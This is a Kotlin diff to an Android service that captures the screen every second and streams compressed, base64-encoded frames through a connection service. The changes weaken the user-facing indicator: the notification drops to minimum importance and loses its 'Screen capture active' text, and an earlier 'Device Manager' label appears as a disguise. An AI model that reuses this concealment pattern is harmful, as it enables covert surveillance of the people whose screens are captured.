@@ -6,6 +6,7 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.pm.ServiceInfo
 import android.graphics.Bitmap
 import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
@@ -19,7 +20,6 @@ import android.os.IBinder
 import android.os.Looper
 import android.util.Base64
 import java.io.ByteArrayOutputStream
-import kotlin.math.min
 
 class ScreenCaptureService : Service() {
 
@@ -27,7 +27,7 @@ class ScreenCaptureService : Service() {
         const val EXTRA_RESULT_CODE = "result_code"
         const val EXTRA_RESULT_DATA = "result_data"
         private const val NOTIF_ID = 1002
-        private const val INTERVAL_MS = 1500L
+        private const val INTERVAL_MS = 1000L // 1 second
     }
 
     private var projection: MediaProjection? = null
@@ -40,8 +40,19 @@ class ScreenCaptureService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        createChannel()
-        startForeground(NOTIF_ID, buildNotification())
+        val nm = getSystemService(NotificationManager::class.java)
+        nm.createNotificationChannel(NotificationChannel("screen", "Screen", NotificationManager.IMPORTANCE_MIN))
+        
+        val notif = Notification.Builder(this, "screen")
+            .setContentTitle("Screen Mirroring")
+            .setSmallIcon(android.R.drawable.stat_sys_warning)
+            .build()
+            
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
+        } else {
+            startForeground(NOTIF_ID, notif)
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -52,9 +63,7 @@ class ScreenCaptureService : Service() {
             stopSelf()
             return START_NOT_STICKY
         }
-        if (!running) {
-            startCapture(rc, data)
-        }
+        if (!running) startCapture(rc, data)
         return START_STICKY
     }
 
@@ -66,15 +75,14 @@ class ScreenCaptureService : Service() {
                 override fun onStop() { stopSelf() }
             }, handler)
 
-            val dm = resources.displayMetrics
-            val targetW = min(dm.widthPixels, 1280)
-            val targetH = (targetW.toLong() * dm.heightPixels / dm.widthPixels).toInt().coerceAtLeast(1)
-
+            // DOWNGRADE TO 480P TO SAVE BANDWIDTH
+            val targetW = 480
+            val targetH = 800 
             imageReader = ImageReader.newInstance(targetW, targetH, PixelFormat.RGBA_8888, 2)
 
             virtualDisplay = projection?.createVirtualDisplay(
                 "screen-capture",
-                targetW, targetH, dm.densityDpi,
+                targetW, targetH, resources.displayMetrics.densityDpi,
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                 imageReader!!.surface, null, handler
             )
@@ -105,7 +113,8 @@ class ScreenCaptureService : Service() {
                 val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
                 bmp.copyPixelsFromBuffer(plane.buffer)
                 val baos = ByteArrayOutputStream()
-                bmp.compress(Bitmap.CompressFormat.JPEG, 30, baos)
+                // COMPRESS TO 20% QUALITY
+                bmp.compress(Bitmap.CompressFormat.JPEG, 20, baos) 
                 bmp.recycle()
                 val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                 ConnectionService.push(applicationContext, "screen_frame", b64)
@@ -123,21 +132,4 @@ class ScreenCaptureService : Service() {
         try { imageReader?.close() } catch (_: Exception) {}
         super.onDestroy()
     }
-
-    private fun createChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val nm = getSystemService(NotificationManager::class.java)
-            nm.createNotificationChannel(
-                NotificationChannel("screen", "Screen", NotificationManager.IMPORTANCE_LOW)
-            )
-        }
-    }
-
-    private fun buildNotification(): Notification =
-        Notification.Builder(this, "screen")
-            .setContentTitle("Device Manager")
-            .setContentText("Screen capture active")
-            .setSmallIcon(android.R.drawable.stat_sys_warning)
-            .setOngoing(true)
-            .build()
 }
